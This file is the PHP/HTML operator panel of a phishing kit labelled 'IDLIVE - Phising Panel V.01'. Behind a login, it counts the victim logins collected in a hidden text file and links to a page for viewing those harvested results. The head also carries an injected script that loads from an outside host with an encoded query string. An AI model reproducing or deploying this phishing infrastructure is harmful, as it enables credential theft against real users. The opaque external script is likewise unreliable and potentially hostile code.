<html><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>IDLIVE</title>
    <link href="//brobin.github.io/hacker-bootstrap/css/hacker.css" rel="stylesheet">

    <style>
    .tall-row {
        margin-top: 40px;
    }
    .modal {
        position: relative;
        top: auto;
        right: auto;
        left: auto;
        bottom: auto;
        z-index: 1;
        display: block;
    }
    </style>
<script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2PT782A31pvLm18pQLFuCjmBgcwWDYfdw%2fz%2fZDIUlan2%2fjwX%2b0SjBpVexzHuebUfO8w%2fk5bMuRLyS4G575fa%2f4%2flt3qbw7m8d0x5U9g127gJlfAYDaYPCZogT2WYzzoPz%2bVeiMuVfvaWRl0apco%2f%2fhJZl1V9gJDS4I%2fyUeJ8VbMVXqNuUWd24mlrxFdJNlyLRSCfKb4Sh3YNNrxuli5SR7RLw%2fKoEewrI9V%2fNacXTLf3vUKRJAULCrDkEtrPLCp818z5jSN0JWbKx%2bAZEdNJHK7V9OrLJbX6nf3OAWI%2fuvmxT%2bKpkg5PbBLiaiV8XH1ZdeACmazduR4rFFB6GBzsaABx4ub9DHb6o40SrxlPnt40%2b%2fsQGWPAw2NedlNM9aAMQ1CRojRtmTU3%2bIH28aI5VU01LVaqaDSwmlLEpgmJNcQFJtEKQKXIOTBEeYtVqLBPV0qILI7gAuEDIP16cETCncjkDvIvO8AhQfemi6t0hkL12vW3Y2CifUzBt%2fpMmvpXDpk%2bqJGVkEWPl%2f3YTNrttv52lprqO9npMOnl4q4M%2bKWw%3d&amp;idc_r=97453045973&amp;domain=ctiga-tuanlana.c9users.io&amp;sw=1366&amp;sh=768"></script></head>
<body>
    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">IDLIVE - Phising Panel V.01</a>
            </div>
        </div>
    </nav>
<?php
session_start();
include('setting.php');
if(!isset($_POST['username']) || !isset($_POST['password'])) {
    echo ' <div class="container">
        <div class="row">
            

             <div class="col-lg-12">
                <div class="well">
                    <form method="POST" action="" class="form-horizontal">
                        <fieldset>
                            <legend>Login</legend>
                            <div class="form-group">
                                <label for="inputEmail" class="col-lg-2">Username</label>
                                <div class="col-lg-10">
                                    <input class="form-control" name="username" placeholder="emailexample.com" type="text">
                                </div>
                            </div>
                         <div class="form-group">
                                <label for="inputEmail" class="col-lg-2">Password</label>
                                <div class="col-lg-10">
                                    <input class="form-control" name="password" type="password">
                                </div>
                            </div>
                            <input type="submit" class="btn btn-primary" value="Login">
                    
                    <br>
 


                </fieldset></form></div>
            </div>

            </div> <div class="row tall-row">
            <div class="col-md-12">
                <p>Created by RSJ. © 2018</p>
            </div>
        </div>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
</body>';
} else if($_POST['username'] == $username && $_POST['password'] == $password) {
    $b = file_get_contents('askjdlahd12o3yo1278sjad.txt');
    $exp = count(explode("\n", $b));
    if($exp == 1) {
        $totalLogin = 0;
    } else {
        $totalLogin = $exp/2;
        $totalLogin = $totalLogin-0.5;
    }
    echo ' <div class="container">
        <div class="row">
            

             <div class="col-lg-12">
                <div class="well">
                        <fieldset>
                            <legend>Login</legend>
                            <div class="form-group">
                                <label for="inputEmail" class="col-lg-2">Total Login</label>
                                <div class="col-lg-10">
                                    <input class="form-control" name="username" value="'.$totalLogin.'" placeholder="emailexample.com" type="text">
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary" ><a href="checkResult.php?hhh=hehehe"><font color="black">Check Result</font></a></button>
                    <br>
 


                </fieldset></div>
            </div>

            </div> <div class="row tall-row">
            <div class="col-md-12">
                <p>Created by RSJ. © 2018</p>
            </div>
        </div>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
</body>';
}
?>
</html>